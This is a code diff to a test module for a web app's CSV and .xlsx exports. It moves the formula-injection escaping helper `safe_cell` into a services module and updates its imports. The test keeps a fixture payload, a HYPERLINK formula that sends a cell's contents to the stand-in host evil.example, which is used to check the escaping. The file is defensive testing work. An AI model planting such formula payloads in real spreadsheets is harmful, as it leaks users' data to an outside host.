@@ -3,7 +3,7 @@ Spreadsheet formula injection in exports.
 
 Free text from any user (names, notes, comments, descriptions) is written into
 the site .xlsx and the project CSV. A value starting with = + - @ TAB or CR
-would be stored as / evaluated as a formula, so `_safe_cell` prefixes it with
+would be stored as / evaluated as a formula, so `safe_cell` (app/services/csv_safety.py) prefixes it with
 a single quote. Numbers, dates and None are untouched.
 
 The workbook test swaps in a recording fake `openpyxl` so it runs without the
@@ -25,7 +25,8 @@ from app.models.site import Site
 from app.models.tag import Tag
 from app.models.team import Team
 from app.models.user import User
-from app.routers.export import _safe_cell, build_site_export_workbook, generate_csv
+from app.routers.export import build_site_export_workbook, generate_csv
+from app.services.csv_safety import safe_cell
 
 PAYLOAD = '=HYPERLINK("http://evil.example/?"&A1,"open")'
 
@@ -49,7 +50,7 @@ PAYLOAD = '=HYPERLINK("http://evil.example/?"&A1,"open")'
     ],
 )
 def test_safe_cell(value, expected):
-    assert _safe_cell(value) == expected
+    assert safe_cell(value) == expected
 
 
 def test_project_csv_escapes_user_text():
